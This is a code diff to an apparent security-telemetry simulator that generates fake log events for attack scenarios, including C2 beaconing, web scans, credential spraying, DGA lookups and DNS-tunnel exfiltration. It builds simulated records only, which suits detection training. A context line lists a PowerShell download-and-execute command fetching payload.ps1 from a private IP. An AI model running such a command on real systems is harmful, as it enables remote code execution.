@@ -87,6 +87,53 @@ def _size_storyline_connection(
     return ob, rb
 
 
+def _iter_periodic_ticks(
+    start_time: datetime,
+    interval_sec: float,
+    duration_sec: float | None,
+    count: int | None,
+    jitter: float,
+    rng,
+):
+    """Yield timestamps for periodic bulk events.
+
+    Shared timing engine for beacon, web_scan, credential_spray, dga_queries,
+    dns_tunnel, and any future periodic event types.
+
+    Args:
+        start_time: First event timestamp.
+        interval_sec: Seconds between events.
+        duration_sec: Total campaign length in seconds (None when using count).
+        count: Exact number of events to emit (None when using duration).
+        jitter: Fraction of interval to randomize (0.0–1.0).
+        rng: Random number generator instance.
+
+    Yields:
+        datetime for each tick.
+    """
+    t = 0.0
+    emitted = 0
+    end_time = start_time + timedelta(seconds=duration_sec) if duration_sec is not None else None
+    last_tick = None
+    while True:
+        if duration_sec is not None and t > duration_sec:
+            break
+        if count is not None and emitted >= count:
+            break
+        jitter_offset = rng.uniform(-jitter * interval_sec, jitter * interval_sec)
+        tick_time = start_time + timedelta(seconds=max(0.0, t + jitter_offset))
+        # Clamp to window end (jitter can push past duration)
+        if end_time is not None and tick_time > end_time:
+            tick_time = end_time
+        # Ensure monotonic ordering (jitter can cause inversions)
+        if last_tick is not None and tick_time < last_tick:
+            tick_time = last_tick + timedelta(milliseconds=1)
+        last_tick = tick_time
+        yield tick_time
+        emitted += 1
+        t += interval_sec
+
+
 # Realistic decoded PowerShell commands for base64 encoding
 POWERSHELL_COMMANDS = [
     "IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.100/payload.ps1')",
@@ -1118,57 +1165,624 @@ class StorylineMixin:
             malicious_event["total_connections"] = total_count
             malicious_event["protocol"] = spec.protocol
 
-        elif spec.type == "blocked_c2":
-            interval_td = parse_duration(spec.interval)
-            duration_td = parse_duration(spec.duration)
-            interval_sec = interval_td.total_seconds()
-            duration_sec = duration_td.total_seconds()
+        elif spec.type == "beacon":
+            # Resolve timing parameters
+            start = self._parse_storyline_time(spec.start_time) if spec.start_time else time
+            interval_sec = parse_duration(spec.interval).total_seconds()
+            duration_sec = None
+            count = spec.count
+            if spec.duration is not None:
+                duration_sec = parse_duration(spec.duration).total_seconds()
+            elif spec.end_time is not None:
+                end_dt = self._parse_storyline_time(spec.end_time)
+                duration_sec = (end_dt - start).total_seconds()
 
-            # Determine conn_state from firewall drop_mode
-            conn_state = self._get_firewall_deny_conn_state()
+            beacon_src_ip = spec.source_ip or system.ip
 
-            # Use source_ip override if specified, otherwise use system IP
-            c2_src_ip = spec.source_ip or system.ip
+            # Deny mode: firewall context
+            fw_ctx = None
+            deny_conn_state = None
+            if spec.action == "deny":
+                from evidenceforge.events.contexts import FirewallContext
 
-            # Resolve interfaces
-            src_iface = self._resolve_firewall_interface(c2_src_ip)
-            dst_iface = self._resolve_firewall_interface(spec.dst_ip)
+                deny_conn_state = self._get_firewall_deny_conn_state()
+                src_iface = self._resolve_firewall_interface(beacon_src_ip)
+                dst_iface = self._resolve_firewall_interface(spec.dst_ip)
+                fw_ctx = FirewallContext(
+                    action="deny",
+                    msg_id=106023,
+                    connection_id=0,
+                    src_interface=src_iface,
+                    dst_interface=dst_iface,
+                    access_group=f"{src_iface}_access_in",
+                )
 
-            # Generate periodic denied attempts
-            from evidenceforge.events.contexts import FirewallContext
+            # Allow mode: resolve service, http context, hostname, byte sizing
+            service = spec.service
+            http_ctx = None
+            conn_hostname = None
+            emit_dns = False
+            s_ob, s_rb = _size_storyline_connection(spec, rng)
+            s_conn_state = spec.conn_state or "SF"
+
+            if spec.action == "allow":
+                service = service or (
+                    "ssl" if spec.dst_port == 443 else "http" if spec.dst_port == 80 else "ssl"
+                )
+                # Build HttpContext if HTTP fields are provided
+                if spec.method or spec.uri:
+                    from evidenceforge.events.contexts import HttpContext
+
+                    _method = spec.method or "GET"
+                    _uri = (spec.uri or "/").lower()
+                    if spec.response_body_len is not None:
+                        resp_bytes = spec.response_body_len
+                    elif _method == "POST":
+                        resp_bytes = rng.randint(200, 2000)
+                    else:
+                        resp_bytes = rng.randint(500, 5000)
+                    http_ctx = HttpContext(
+                        method=_method,
+                        host=spec.hostname or spec.dst_ip,
+                        uri=spec.uri or "/",
+                        version="1.1",
+                        user_agent=spec.user_agent or "Mozilla/5.0",
+                        request_body_len=rng.randint(100, 10000) if _method == "POST" else 0,
+                        response_body_len=resp_bytes,
+                        status_code=spec.status_code or 200,
+                        status_msg={
+                            200: "OK",
+                            301: "Moved Permanently",
+                            302: "Found",
+                            403: "Forbidden",
+                            404: "Not Found",
+                            500: "Internal Server Error",
+                        }.get(spec.status_code or 200, "OK"),
+                        resp_mime_types=["text/html"] if (spec.status_code or 200) == 200 else [],
+                        tags=[],
+                    )
+
+                # Hostname / DNS resolution (same logic as connection handler)
+                from evidenceforge.generation.activity.network import REVERSE_DNS
+
+                if spec.hostname:
+                    conn_hostname = spec.hostname
+                    emit_dns = True
+                elif spec.dst_ip in REVERSE_DNS:
+                    conn_hostname = None
+                    emit_dns = True
+                else:
+                    conn_hostname = ""
+                    emit_dns = False
+
+            # Resolve source system
+            src_sys = None
+            ip_map = getattr(self.activity_generator, "_ip_to_system", {})
+            if beacon_src_ip in ip_map:
+                src_sys = ip_map[beacon_src_ip]
+            elif beacon_src_ip == system.ip:
+                src_sys = system
 
             attempt_count = 0
-            t = 0.0
-            while t <= duration_sec:
-                jitter_offset = rng.uniform(-spec.jitter * interval_sec, spec.jitter * interval_sec)
-                attempt_time = time + timedelta(seconds=max(0.0, t + jitter_offset))
-                self.state_manager.set_current_time(attempt_time)
-
-                self.activity_generator.generate_connection(
-                    src_ip=c2_src_ip,
-                    dst_ip=spec.dst_ip,
-                    time=attempt_time,
-                    dst_port=spec.dst_port,
-                    proto=spec.protocol,
-                    conn_state=conn_state,
-                    firewall=FirewallContext(
-                        action="deny",
-                        msg_id=106023,
-                        connection_id=0,
-                        src_interface=src_iface,
-                        dst_interface=dst_iface,
-                        access_group=f"{src_iface}_access_in",
-                    ),
-                    emit_dns=False,
-                )
+            for tick_time in _iter_periodic_ticks(
+                start, interval_sec, duration_sec, count, spec.jitter, rng
+            ):
+                self.state_manager.set_current_time(tick_time)
+                if spec.action == "deny":
+                    self.activity_generator.generate_connection(
+                        src_ip=beacon_src_ip,
+                        dst_ip=spec.dst_ip,
+                        time=tick_time,
+                        dst_port=spec.dst_port,
+                        proto=spec.protocol,
+                        conn_state=deny_conn_state,
+                        firewall=fw_ctx,
+                        emit_dns=False,
+                    )
+                else:
+                    # Allow DNS only on the first tick; cache handles the rest
+                    self.activity_generator.generate_connection(
+                        src_ip=beacon_src_ip,
+                        dst_ip=spec.dst_ip,
+                        time=tick_time,
+                        dst_port=spec.dst_port,
+                        proto=spec.protocol,
+                        service=service,
+                        duration=rng.uniform(0.5, 10.0),
+                        orig_bytes=s_ob,
+                        resp_bytes=s_rb,
+                        conn_state=s_conn_state,
+                        emit_dns=emit_dns and attempt_count == 0,
+                        source_system=src_sys,
+                        http=http_ctx,
+                        hostname=conn_hostname,
+                        pid=getattr(self, "_last_storyline_pid", -1) or -1,
+                    )
                 attempt_count += 1
-                t += interval_sec
 
             malicious_event["dst_ip"] = spec.dst_ip
             malicious_event["dst_port"] = spec.dst_port
             malicious_event["interval"] = spec.interval
-            malicious_event["duration"] = spec.duration
+            malicious_event["action"] = spec.action
+            term = spec.duration or spec.end_time or f"count={spec.count}"
+            malicious_event["termination"] = term
             malicious_event["attempt_count"] = attempt_count
+
+        elif spec.type == "dns_query":
+            # QTYPE name → numeric mapping
+            _QTYPE_MAP = {
+                "A": 1,
+                "AAAA": 28,
+                "TXT": 16,
+                "CNAME": 5,
+                "MX": 15,
+                "NULL": 10,
+                "SRV": 33,
+                "PTR": 12,
+            }
+            _RCODE_MAP = {"NOERROR": 0, "NXDOMAIN": 3, "SERVFAIL": 2, "REFUSED": 5}
+
+            from evidenceforge.events.contexts import DnsContext
+
+            qtype_num = _QTYPE_MAP.get(spec.qtype, 1)
+            rcode_num = _RCODE_MAP.get(spec.rcode, 0)
+
+            # Build answers list
+            answers = []
+            ttls = []
+            if spec.answer is not None:
+                answers = [spec.answer] if isinstance(spec.answer, str) else list(spec.answer)
+                ttl_val = float(spec.ttl) if spec.ttl is not None else float(rng.randint(60, 3600))
+                ttls = [ttl_val] * len(answers)
+
+            dns_ctx = DnsContext(
+                query=spec.query,
+                query_type=spec.qtype,
+                qtype=qtype_num,
+                rcode=spec.rcode,
+                rcode_num=rcode_num,
+                answers=answers,
+                TTLs=ttls,
+                trans_id=rng.randint(1, 65535),
+                AA=False,
+                RD=True,
+                RA=True,
+                rejected=spec.rcode == "REFUSED",
+                rtt=rng.uniform(1.0, 50.0),
+            )
+
+            # Resolve DNS server IP
+            dns_server_ips = getattr(self.activity_generator, "_dns_server_ips", ["10.0.0.1"])
+            dns_server_ip = rng.choice(dns_server_ips)
+            query_src_ip = spec.source_ip or system.ip
+
+            self.activity_generator.generate_connection(
+                src_ip=query_src_ip,
+                dst_ip=dns_server_ip,
+                time=time,
+                dst_port=53,
+                proto="udp",
+                service="dns",
+                dns=dns_ctx,
+                emit_dns=False,
+                orig_bytes=rng.randint(40, 100),
+                resp_bytes=rng.randint(80, 400) if spec.rcode == "NOERROR" else rng.randint(40, 80),
+                conn_state="SF",
+                duration=rng.uniform(0.001, 0.05),
+            )
+
+            malicious_event["query"] = spec.query
+            malicious_event["qtype"] = spec.qtype
+            malicious_event["rcode"] = spec.rcode
+
+        elif spec.type == "web_scan":
+            from evidenceforge.config.web_scan_presets import get_preset
+            from evidenceforge.events.contexts import HttpContext
+
+            # Load preset and merge with overrides
+            scan_paths = []
+            scan_ua = spec.user_agent or "Mozilla/5.0"
+            if spec.preset:
+                preset_data = get_preset(spec.preset)
+                if preset_data is None:
+                    logger.warning("Unknown web_scan preset: %s", spec.preset)
+                else:
+                    scan_paths = list(preset_data.get("paths", []))
+                    scan_ua = spec.user_agent or preset_data.get("user_agent", scan_ua)
+            if spec.paths:
+                scan_paths.extend(spec.paths)
+            if not scan_paths:
+                raise ValueError(
+                    f"web_scan resolved to zero paths (preset={spec.preset!r}). "
+                    "Check preset name or provide explicit paths."
+                )
+
+            # Timing: rate-based → convert to interval
+            start = self._parse_storyline_time(spec.start_time) if spec.start_time else time
+            interval_sec = 1.0 / spec.rate
+            duration_sec = None
+            count = spec.count
+            if spec.duration is not None:
+                duration_sec = parse_duration(spec.duration).total_seconds()
+            elif spec.end_time is not None:
+                end_dt = self._parse_storyline_time(spec.end_time)
+                duration_sec = (end_dt - start).total_seconds()
+
+            scan_src_ip = spec.source_ip or system.ip
+            scan_host = spec.hostname or spec.dst_ip
+            service = "http" if spec.dst_port == 80 else "ssl"
+
+            # Resolve source system
+            src_sys = None
+            ip_map = getattr(self.activity_generator, "_ip_to_system", {})
+            if scan_src_ip in ip_map:
+                src_sys = ip_map[scan_src_ip]
+            elif scan_src_ip == system.ip:
+                src_sys = system
+
+            request_count = 0
+            path_idx = 0
+            for tick_time in _iter_periodic_ticks(
+                start, interval_sec, duration_sec, count, spec.jitter, rng
+            ):
+                self.state_manager.set_current_time(tick_time)
+                path_entry = scan_paths[path_idx % len(scan_paths)]
+                path_idx += 1
+
+                _method = path_entry.get("method", "GET")
+                _uri = path_entry.get("uri", "/")
+                _status = path_entry.get("status", 404)
+
+                http_ctx = HttpContext(
+                    method=_method,
+                    host=scan_host,
+                    uri=_uri,
+                    version="1.1",
+                    user_agent=scan_ua,
+                    request_body_len=rng.randint(100, 500) if _method == "POST" else 0,
+                    response_body_len=rng.randint(200, 5000),
+                    status_code=_status,
+                    status_msg={
+                        200: "OK",
+                        301: "Moved Permanently",
+                        302: "Found",
+                        403: "Forbidden",
+                        404: "Not Found",
+                        405: "Method Not Allowed",
+                        500: "Internal Server Error",
+                    }.get(_status, "OK"),
+                    resp_mime_types=["text/html"] if _status == 200 else [],
+                    tags=[],
+                )
+
+                self.activity_generator.generate_connection(
+                    src_ip=scan_src_ip,
+                    dst_ip=spec.dst_ip,
+                    time=tick_time,
+                    dst_port=spec.dst_port,
+                    service=service,
+                    duration=rng.uniform(0.01, 0.5),
+                    orig_bytes=rng.randint(200, 2000),
+                    resp_bytes=rng.randint(200, 5000),
+                    conn_state="SF",
+                    emit_dns=request_count == 0,
+                    source_system=src_sys,
+                    http=http_ctx,
+                    hostname=scan_host if spec.hostname else None,
+                    pid=getattr(self, "_last_storyline_pid", -1) or -1,
+                )
+                request_count += 1
+
+            malicious_event["dst_ip"] = spec.dst_ip
+            malicious_event["dst_port"] = spec.dst_port
+            malicious_event["preset"] = spec.preset
+            malicious_event["request_count"] = request_count
+
+        elif spec.type == "credential_spray":
+            # Timing
+            start = self._parse_storyline_time(spec.start_time) if spec.start_time else time
+            interval_sec = parse_duration(spec.interval).total_seconds()
+            duration_sec = None
+            count = spec.count
+            if spec.duration is not None:
+                duration_sec = parse_duration(spec.duration).total_seconds()
+            elif spec.end_time is not None:
+                end_dt = self._parse_storyline_time(spec.end_time)
+                duration_sec = (end_dt - start).total_seconds()
+
+            spray_src_ip = spec.source_ip or system.ip
+            accounts = spec.target_accounts
+            success_spec = spec.success
+            success_account = success_spec.get("account") if success_spec else None
+            success_after = success_spec.get("after", 0) if success_spec else 0
+
+            # Resolve target accounts — include service accounts as synthetic User
+            # objects so credential_spray targets resolve for both failed and success logons
+            from evidenceforge.models.scenario import User as _User
+
+            scenario_users = {u.username: u for u in self.scenario.environment.users}
+            ad_domain = self.scenario.environment.domain or "corp.local"
+            for svc_name in self.scenario.environment.service_accounts:
+                if svc_name not in scenario_users:
+                    scenario_users[svc_name] = _User(
+                        username=svc_name,
+                        full_name=svc_name,
+                        email=f"{svc_name}@{ad_domain}",
+                    )
+
+            # Only attach DC for Windows domain-account sprays — Linux SSH brute
+            # force or local-account attacks should not produce DC-side 4625/4776
+            dc_system = None
+            is_windows_target = "windows" in system.os.lower()
+            has_domain_account = any(acct in scenario_users for acct in accounts)
+            if is_windows_target and has_domain_account:
+                dcs = [
+                    s for s in self.scenario.environment.systems if s.type == "domain_controller"
+                ]
+                if dcs:
+                    # Deterministic DC per source IP (mimics AD DC Locator caching)
+                    dc_idx = _stable_seed(f"preferred_dc_{spray_src_ip}") % len(dcs)
+                    dc_system = dcs[dc_idx]
+
+            attempt_count = 0
+            for tick_time in _iter_periodic_ticks(
+                start, interval_sec, duration_sec, count, spec.jitter, rng
+            ):
+                self.state_manager.set_current_time(tick_time)
+
+                # Success fires at exactly the requested attempt count,
+                # regardless of which account the pattern would have selected
+                if success_account and attempt_count == success_after:
+                    target_user = scenario_users.get(success_account, actor)
+                    self.activity_generator.generate_logon(
+                        user=target_user,
+                        system=system,
+                        time=tick_time,
+                        logon_type=spec.logon_type,
+                        source_ip=spray_src_ip,
+                    )
+                    attempt_count += 1
+                    malicious_event["success_account"] = success_account
+                    malicious_event["success_at_attempt"] = attempt_count
+                    break
+
+                # Select target account based on pattern
+                if spec.pattern == "spray":
+                    target_account = accounts[attempt_count % len(accounts)]
+                elif spec.pattern == "brute_force":
+                    target_account = accounts[
+                        min(
+                            attempt_count // max(1, (spec.count or 100) // len(accounts)),
+                            len(accounts) - 1,
+                        )
+                    ]
+                else:  # stuffing
+                    target_account = accounts[attempt_count % len(accounts)]
+
+                target_user = scenario_users.get(target_account, actor)
+
+                self.activity_generator.generate_failed_logon(
+                    user=target_user,
+                    system=system,
+                    time=tick_time,
+                    logon_type=spec.logon_type,
+                    source_ip=spray_src_ip,
+                    target_username=target_account,
+                    dc_system=dc_system,
+                )
+                attempt_count += 1
+
+            malicious_event["pattern"] = spec.pattern
+            malicious_event["target_accounts"] = accounts
+            malicious_event["attempt_count"] = attempt_count
+
+        elif spec.type == "dga_queries":
+            import random as _random
+
+            from evidenceforge.events.contexts import DnsContext
+
+            # Timing
+            start = self._parse_storyline_time(spec.start_time) if spec.start_time else time
+            interval_sec = parse_duration(spec.interval).total_seconds()
+            duration_sec = None
+            count = spec.count
+            if spec.duration is not None:
+                duration_sec = parse_duration(spec.duration).total_seconds()
+            elif spec.end_time is not None:
+                end_dt = self._parse_storyline_time(spec.end_time)
+                duration_sec = (end_dt - start).total_seconds()
+
+            # DGA RNG — separate from main rng for reproducibility
+            dga_seed = spec.seed if spec.seed is not None else rng.randint(0, 2**31)
+            dga_rng = _random.Random(dga_seed)
+
+            # Rcode distribution
+            rcode_dist = spec.rcode_distribution or {"NXDOMAIN": 0.95, "NOERROR": 0.05}
+            rcode_names = list(rcode_dist.keys())
+            rcode_weights = list(rcode_dist.values())
+
+            _RCODE_MAP = {"NOERROR": 0, "NXDOMAIN": 3, "SERVFAIL": 2, "REFUSED": 5}
+            _QTYPE_MAP = {"A": 1, "AAAA": 28, "TXT": 16, "CNAME": 5}
+
+            query_src_ip = spec.source_ip or system.ip
+            dns_server_ips = getattr(self.activity_generator, "_dns_server_ips", ["10.0.0.1"])
+
+            query_count = 0
+            nxdomain_count = 0
+            domain_sample = []
+            for tick_time in _iter_periodic_ticks(
+                start, interval_sec, duration_sec, count, spec.jitter, rng
+            ):
+                self.state_manager.set_current_time(tick_time)
+
+                # Generate random domain
+                label_len = dga_rng.randint(*spec.length_range)
+                label = "".join(dga_rng.choices(spec.charset, k=label_len))
+                domain = f"{label}{spec.tld}"
+
+                # Select rcode
+                rcode_name = dga_rng.choices(rcode_names, weights=rcode_weights, k=1)[0]
+                rcode_num = _RCODE_MAP.get(rcode_name, 3)
+
+                answers = []
+                ttls = []
+                if rcode_name == "NOERROR" and spec.answer_ip:
+                    answers = [spec.answer_ip]
+                    ttls = [float(dga_rng.randint(60, 3600))]
+                if rcode_name == "NXDOMAIN":
+                    nxdomain_count += 1
+
+                dns_ctx = DnsContext(
+                    query=domain,
+                    query_type="A",
+                    qtype=1,
+                    rcode=rcode_name,
+                    rcode_num=rcode_num,
+                    answers=answers,
+                    TTLs=ttls,
+                    trans_id=rng.randint(1, 65535),
+                    AA=False,
+                    RD=True,
+                    RA=True,
+                    rejected=False,
+                    rtt=rng.uniform(1.0, 50.0),
+                )
+
+                dns_server_ip = rng.choice(dns_server_ips)
+                self.activity_generator.generate_connection(
+                    src_ip=query_src_ip,
+                    dst_ip=dns_server_ip,
+                    time=tick_time,
+                    dst_port=53,
+                    proto="udp",
+                    service="dns",
+                    dns=dns_ctx,
+                    emit_dns=False,
+                    orig_bytes=rng.randint(40, 100),
+                    resp_bytes=rng.randint(80, 400)
+                    if rcode_name == "NOERROR"
+                    else rng.randint(40, 80),
+                    conn_state="SF",
+                    duration=rng.uniform(0.001, 0.05),
+                )
+                query_count += 1
+                if len(domain_sample) < 5:
+                    domain_sample.append(domain)
+
+            malicious_event["total_queries"] = query_count
+            malicious_event["nxdomain_count"] = nxdomain_count
+            malicious_event["domain_sample"] = domain_sample
+            malicious_event["tld"] = spec.tld
+
+        elif spec.type == "dns_tunnel":
+            import base64 as _b64
+
+            from evidenceforge.events.contexts import DnsContext
+
+            _QTYPE_MAP = {"TXT": 16, "NULL": 10, "CNAME": 5}
+            _RCODE_MAP = {"NOERROR": 0}
+
+            # Timing
+            start = self._parse_storyline_time(spec.start_time) if spec.start_time else time
+            interval_sec = parse_duration(spec.interval).total_seconds()
+            duration_sec = None
+            count = spec.count
+            if spec.duration is not None:
+                duration_sec = parse_duration(spec.duration).total_seconds()
+            elif spec.end_time is not None:
+                end_dt = self._parse_storyline_time(spec.end_time)
+                duration_sec = (end_dt - start).total_seconds()
+
+            query_src_ip = spec.source_ip or system.ip
+            dns_server_ips = getattr(self.activity_generator, "_dns_server_ips", ["10.0.0.1"])
+
+            # Generate or use payload
+            if spec.payload:
+                payload_bytes = spec.payload.encode("utf-8")
+            else:
+                payload_bytes = rng.randbytes(spec.payload_size)
+
+            # Calculate bytes per label based on encoding
+            if spec.encoding == "hex":
+                bytes_per_label = spec.label_length // 2
+            elif spec.encoding == "base32":
+                bytes_per_label = (spec.label_length * 5) // 8
+            else:  # base64
+                bytes_per_label = (spec.label_length * 3) // 4
+            bytes_per_label = max(1, bytes_per_label)
+
+            # Chunk payload
+            chunks = []
+            for i in range(0, len(payload_bytes), bytes_per_label):
+                chunks.append(payload_bytes[i : i + bytes_per_label])
+
+            qtype_num = _QTYPE_MAP.get(spec.qtype, 16)
+            total_bytes = 0
+            query_count = 0
+            chunk_idx = 0
+
+            for tick_time in _iter_periodic_ticks(
+                start, interval_sec, duration_sec, count, spec.jitter, rng
+            ):
+                self.state_manager.set_current_time(tick_time)
+
+                chunk = chunks[chunk_idx % len(chunks)]
+                chunk_idx += 1
+
+                # Encode chunk
+                if spec.encoding == "hex":
+                    encoded = chunk.hex()
+                elif spec.encoding == "base32":
+                    encoded = _b64.b32encode(chunk).decode("ascii").rstrip("=").lower()
+                else:  # base64
+                    encoded = _b64.urlsafe_b64encode(chunk).decode("ascii").rstrip("=").lower()
+
+                # Truncate to label_length
+                encoded = encoded[: spec.label_length]
+                tunnel_query = f"{encoded}.{spec.base_domain}"
+
+                # TXT responses carry data back; CNAME/NULL are smaller
+                if spec.qtype == "TXT":
+                    resp_bytes = rng.randint(200, 2000)
+                else:
+                    resp_bytes = rng.randint(50, 200)
+
+                dns_ctx = DnsContext(
+                    query=tunnel_query,
+                    query_type=spec.qtype,
+                    qtype=qtype_num,
+                    rcode="NOERROR",
+                    rcode_num=0,
+                    answers=[f"v={encoded[:20]}"],
+                    TTLs=[float(rng.randint(1, 10))],
+                    trans_id=rng.randint(1, 65535),
+                    AA=False,
+                    RD=True,
+                    RA=True,
+                    rejected=False,
+                    rtt=rng.uniform(5.0, 100.0),
+                )
+
+                dns_server_ip = rng.choice(dns_server_ips)
+                self.activity_generator.generate_connection(
+                    src_ip=query_src_ip,
+                    dst_ip=dns_server_ip,
+                    time=tick_time,
+                    dst_port=53,
+                    proto="udp",
+                    service="dns",
+                    dns=dns_ctx,
+                    emit_dns=False,
+                    resp_bytes=resp_bytes,
+                )
+                total_bytes += len(chunk)
+                query_count += 1
+
+            malicious_event["base_domain"] = spec.base_domain
+            malicious_event["encoding"] = spec.encoding
+            malicious_event["qtype"] = spec.qtype
+            malicious_event["total_queries"] = query_count
+            malicious_event["bytes_exfiltrated"] = total_bytes
 
         elif spec.type == "raw":
             self.activity_generator.generate_raw(
